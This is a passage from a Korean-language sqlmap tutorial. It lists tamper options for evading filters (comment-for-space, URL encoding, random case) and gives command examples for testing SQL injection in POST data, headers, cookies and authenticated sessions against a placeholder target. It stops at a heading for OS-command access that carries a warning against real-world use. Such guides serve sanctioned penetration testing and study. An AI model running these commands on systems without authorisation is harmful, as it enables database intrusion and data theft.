    # space2comment: 공백을 /**/ 으로
    # charencode: URL 인코딩
    # randomcase: SeLeCt 처럼 대소문자 혼합
    ```

    ▶ 6단계: POST / 헤더 / Cookie 점검
    ```bash
    # POST 본문
    sqlmap -u "http://target/login" --data="user=a&pass=b" --batch
    # 헤더 (-H 또는 --random-agent)
    sqlmap -u "..." -H "X-Custom: value" --batch
    # 쿠키
    sqlmap -u "..." --cookie="sess=abc; PHPSESSID=def" --batch
    # 인증 후 점검
    sqlmap -u "..." --auth-type=basic --auth-cred=admin:pass --batch
    ```

    ▶ 7단계: OS 명령 / 파일 (위험 — 실 환경 금지)
